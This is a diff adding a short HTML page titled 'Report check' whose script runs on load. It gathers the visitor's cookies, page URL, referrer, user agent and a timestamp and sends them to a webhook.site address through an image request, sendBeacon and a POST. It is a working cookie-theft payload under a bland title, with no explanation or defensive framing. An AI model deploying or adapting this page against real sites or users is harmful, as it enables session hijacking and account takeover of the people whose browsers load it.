@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Report check</title>
+</head>
+<body>
+  <script>
+    const webhook = "https://webhook.site/8c83beb0-14c6-4260-98be-d5d69a8afbb0";
+    const payload = {
+      href: location.href,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      cookie: document.cookie,
+      ts: new Date().toISOString()
+    };
+
+    const query = new URLSearchParams({
+      c: payload.cookie,
+      u: payload.href,
+      r: payload.referrer,
+      t: payload.ts
+    });
+
+    new Image().src = `${webhook}?${query.toString()}`;
+    navigator.sendBeacon(webhook, JSON.stringify(payload));
+    fetch(webhook, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {"Content-Type": "text/plain"},
+      body: JSON.stringify(payload)
+    });
+  </script>
+</body>
+</html>
